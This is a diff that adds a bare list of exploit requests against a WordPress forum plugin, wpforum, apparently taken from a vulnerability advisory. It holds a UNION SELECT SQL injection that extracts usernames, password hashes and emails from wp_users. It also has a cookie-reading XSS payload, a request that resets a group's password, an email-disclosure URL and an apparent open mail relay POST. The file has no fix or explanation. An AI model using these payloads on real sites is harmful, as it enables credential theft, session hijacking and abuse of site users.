@@ -1,0 +1,14 @@
+http://www.example.com/wordpress/?page_id=&lt;forum&gt;&amp;forumaction=group_login&amp;group_id=0%20UNION%20SELECT%20CONCAT_WS%28CHAR%2858%29,user_login,user_pass,user_email%29%20FROM%20wp_users%20LIMIT%201%20%23
+
+http://www.example.com/wordpress/&lt;forum&gt;?forumaction=group_login&amp;group_id=&lt;script&gt;alert(document.cookie);&lt;%2fscript&gt;
+
+http://www.example.com/wordpress/wp-content/plugins/wpforum/wp-forum-manage.php?editgroupsubmit=true&amp;group=&lt;group
+id&gt;&amp;groupname=&lt;new group name&gt;&amp;passwd=&lt;new group password&gt;
+
+http://www.example.com/wordpress/wp-content/plugins/wpforum/sendmail.php?user=&lt;user
+id&gt; (email address will be in HTML source)
+
+POST &#039;submit=true&amp;sender=&lt;from address&gt;&amp;email=&lt;to
+address&gt;&amp;message=&lt;body&gt;&amp;subject=&lt;subject&gt;&amp;replyto=&lt;replyto&gt;
+    to http://www.example.com/wordpress/wp-content/plugins/wpforum/sendmail.php
+(untested)
